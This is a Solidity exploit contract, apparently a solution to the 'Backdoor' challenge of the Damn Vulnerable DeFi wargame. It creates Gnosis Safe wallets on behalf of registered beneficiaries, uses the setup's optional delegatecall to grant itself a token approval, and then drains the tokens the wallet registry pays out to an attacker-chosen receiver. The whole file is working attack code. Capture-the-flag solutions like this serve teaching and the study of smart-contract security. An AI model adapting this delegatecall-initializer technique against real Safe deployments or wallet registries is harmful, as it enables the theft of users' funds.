// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "../../DamnValuableToken.sol";

/**
 * @title BackdoorAttacker
 * @author y0ng0p3 (https://github.com/y0ng0p3/)
 */
contract BackdoorAttacker {
    address masterCopyAddress;
    address walletFactoryAddress;
    address walletRegistryAddress;

    constructor(
        address _masterCopyAddress,
        address _walletFactoryAddress,
        address _walletRegistryAddress 
        // address _tokenAddress
        // address[] memory _victims
    )
    {
        masterCopyAddress = _masterCopyAddress;
        walletFactoryAddress = _walletFactoryAddress;
        walletRegistryAddress = _walletRegistryAddress;
    }

    function delegateApprove(address _tokenAddress, address _spender) external {
        IERC20(_tokenAddress).approve(_spender, 10 ether);
    }

    function attack(
        address _tokenAddress,
        address _receiver,
        address[] memory _victims
    ) external {
        // we create a new safe wallet for every beneficiary registered in wallet's registry
        for (uint256 i = 0; i < _victims.length; i++) {
            address[] memory _victim = new address[](1);
            _victim[0] = _victims[i];

            // encode payload to approve tokens for this contract
            bytes memory encodedDelegateApprove = abi.encodeWithSignature(
                "delegateApprove(address,address)",
                _tokenAddress,
                address(this)
            );

            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                _victim, // _owners: List of Safe owners.
                1, // _threshold: Number of required confirmations for a Safe transaction.
                address(this), // to: Contract address for optional delegate call.
                encodedDelegateApprove, // data: Data payload for optional delegate call.
                address(0), // fallbackHandler: Handler for fallback calls to this contract
                address(0), // paymentToken: Token that should be used for the payment (0 is ETH)
                0, // payment: Value that should be paid
                address(0) // paymentReceiver: Adddress that should receive the payment (or 0 if tx.origin)
            );

            // create wallet on behalf of beneficiary
            GnosisSafeProxy wallet = GnosisSafeProxyFactory(
                walletFactoryAddress
            ).createProxyWithCallback(
                    masterCopyAddress, // _singleton: Address of singleton contract.
                    initializer, // initializer: Payload for message call sent to new proxy contract.
                    i, // saltNonce: Nonce that will be used to generate the salt to calculate the address of the new proxy contract.
                    IProxyCreationCallback(walletRegistryAddress) // callback: Callback that will be invoced after the new proxy contract has been successfully deployed and initialized.
                );

            // transfer tokens to owner (attacker)
            IERC20(_tokenAddress).transferFrom(
                address(wallet),
                _receiver,
                10 ether
            );
        }
    }
}
